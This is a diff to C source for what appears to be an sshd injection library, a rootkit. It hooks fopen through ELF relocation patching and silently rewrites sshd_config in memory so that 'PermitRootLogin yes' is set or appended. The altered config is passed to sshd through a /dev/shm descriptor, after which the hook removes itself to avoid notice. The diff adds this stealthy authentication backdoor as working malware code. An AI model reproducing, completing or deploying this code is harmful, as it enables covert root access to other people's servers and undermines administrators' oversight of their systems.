@@ -9,7 +9,6 @@
 
 #include <security/pam_appl.h>
 #include <sys/mman.h>
-#include <sys/stat.h>
 
 #include <dlfcn.h>
 #include <link.h>
@@ -180,7 +179,7 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 }
 
 /*
- * we will need another hook -- for the relocations that use bitwise logic
+ * we will need another hook -- for RELOC_SYMORTYPE
  */
 static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
 {
@@ -239,7 +238,7 @@ static int is_sshd(struct link_map *link_map)
 }
 
 /*
- * TODO: fix PermitRootLogin
+ *
  */
 static int my_pam_auth(struct pam_handle *pamh, int flags)
 {
@@ -272,6 +271,9 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 /*
  * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
  *	and then unhook ourselves sneaky beaky like
+ * TODO: sanity
+ * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
+ * TODO: modularity - PasswordAuthentication and whatever other config necessary to change
  */
 Elf64_Rela *ref_fopen_Rela;
 FILE *(*ref_fopen)(char*, char*);
@@ -301,13 +303,23 @@ FILE *my_fopen(char *filename, char *mode)
 		PermitRootLogin = strstr(str, "PermitRootLogin");
 		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
 		if (PermitRootLogin != NULL) {
-			char *setting;
-			
-			setting = strstr(PermitRootLogin, "Yes");	
+
+			/* test if PermitRootLogin is commented
+			 *	if it is - make sure noset is false (readability mostly) and break to the case
+			 * 	that PermitRootLogin is not set explicitly to No and will need to be appended
+			 */
+			char *testcomment = (char*) PermitRootLogin - 1;
+			if (testcomment[0] == '#') {
+				noset = false;
+				break;
+			}
+
+
+			char *setting = strstr(PermitRootLogin, "Yes");	
 			if (setting == NULL)
 				setting = strstr(PermitRootLogin, "yes");	
 			/*
-			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela -- we gucci boyz
+			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela
 			 *	otherwise we are going to dupe sshd_config
 			 */
 			if (setting != NULL) {
@@ -322,7 +334,7 @@ FILE *my_fopen(char *filename, char *mode)
 			if (setting != NULL) {
 				noset = true;
 				break;
-				/* break to below -- No is explicity set */
+				/* break to below -- No is explicitly set */
 			}
 		}
 	}
@@ -332,7 +344,8 @@ FILE *my_fopen(char *filename, char *mode)
 	stat(filename, &st);
 	orig_sshd_config_size = st.st_size;
 
-	/* TODO: do this in memory */
+	char *repl = "PermitRootLogin yes\n";
+
 	if (noset == true) {
 		/* "PermitRootLogin No" was explicity set */
 		
@@ -351,7 +364,6 @@ FILE *my_fopen(char *filename, char *mode)
 		memcpy(new, buf, bytes_from_start);
 		
 		/* ... */
-		char *repl = "PermitRootLogin Yes\n";
 		strncat(new, repl, strlen(repl));
 
 		/* ... */
@@ -361,25 +373,93 @@ FILE *my_fopen(char *filename, char *mode)
 		/* this cuts out "PermitRootLogin No\n" and should also give us enough space (+1) to write Yes */
 		PermitRootLogin = (char *) PermitRootLogin + (unsigned long long ) newline;
 
-		/* buf + org_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
+		/* buf + orig_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
 		void *end = (char *) buf + (unsigned long long) orig_sshd_config_size;
 		
 		/* PermitRootLogin has been cut out correctly (+1) as said above. now we just copy the rest of the config into new */
 		unsigned long long bytes_left = (char *)end - (char *) PermitRootLogin;
 
 		strncat(new, PermitRootLogin, bytes_left);
+
+		/* small cleanup */
+		fclose(fp); /* XXX: change - this FILE* will be useful for error recovery if necessary */
+		close(orig_fd);	
 		free(buf);
 
-		/* figure out mmap crap -- prob need to fix ref_fopen -- use fopen with file descriptor? */
-		int fd = -1;
-		void *m = mmap(NULL, orig_sshd_config_size + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, (off_t)NULL);
+		/* the new sshd_config is now set up correctly */	
+	
+		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
+		
+		ftruncate(fd, orig_sshd_config_size + 1);
 
-		munmap(m, orig_sshd_config_size + 1);	
+		mmap(0, orig_sshd_config_size + 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
+
+		write(fd, new, orig_sshd_config_size + 1);
+
+		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
+		fp = fdopen(fd, mode);
+		rewind(fp);
+
+		shm_unlink("/7355608");
+
+
+		/* job well done... reset our RELA -- don't care about any more fopens */
+		hook_rela_addend(ref_fopen_Rela, ref_fopen);
+
 		free(new);
+			
+		return fp;
+	
 	} else {
-		/* we do not want to use the default PERMIT_NOT_SET -- we want to use PERMIT_YES so pam will authenticate us */
+		/* PermitRootLogin has NOT been explicity set, and sshd will default to PERMIT_NOT_SET -- not good */
+		int repl_len = strlen(repl);
+		char *new = malloc(orig_sshd_config_size + repl_len);
+		
+		int orig_fd = open(filename, O_RDONLY);
+		read(orig_fd, new, orig_sshd_config_size);
+
+		close(orig_fd);
+		fclose(fp);
 
 
+		/* some junk gets tacked on to the end of sshd_configs -- don't know what it is
+		 *
+		 * set pch to the end of the sshd_config in memory, use strchr to find '\n' -- thus giving us the actual end of a valid config option
+		 */
+
+		int i;
+		char *pch = (char *) new + (unsigned long long) orig_sshd_config_size;
+		for (i = 10; i < 0; i--) {
+			pch = strchr(pch, '\n');
+			if (pch != NULL)
+				break;
+			pch = (char *) pch - 1;
+		}
+		
+		memcpy(pch, repl, repl_len);	
+
+
+		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
+		
+		ftruncate(fd, orig_sshd_config_size + repl_len);
+
+		mmap(0, orig_sshd_config_size + repl_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
+
+		write(fd, new, orig_sshd_config_size + repl_len);
+
+		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
+		fp = fdopen(fd, mode);
+		rewind(fp);
+
+		shm_unlink("/7355608");
+
+
+		/* job well done... reset our RELA -- don't care about any more fopens */
+		hook_rela_addend(ref_fopen_Rela, ref_fopen);
+
+		free(new);
+			
+		return fp;
 	}
 
 
@@ -388,10 +468,12 @@ FILE *my_fopen(char *filename, char *mode)
 
 
 	
-done:	
-	free(str);
+done:
+	hook_rela_addend(ref_fopen_Rela, ref_fopen);
 
+	free(str);
 	fsetpos(fp, &ref_pos);
+
 	return fp;
 }
 
@@ -473,6 +555,10 @@ static void  __attribute__ ((constructor)) init(void)
 	/* checking type is pretty much a formaility at the moment -- but will be useful later */
 	if (type == RELOC_ADDEND) {
 		ref_fopen = (void *) foundrela->r_addend;
+
+		ref_fopen_Rela = foundrela;
+
+
 		hook_rela_addend(foundrela, my_fopen);
 
 	}
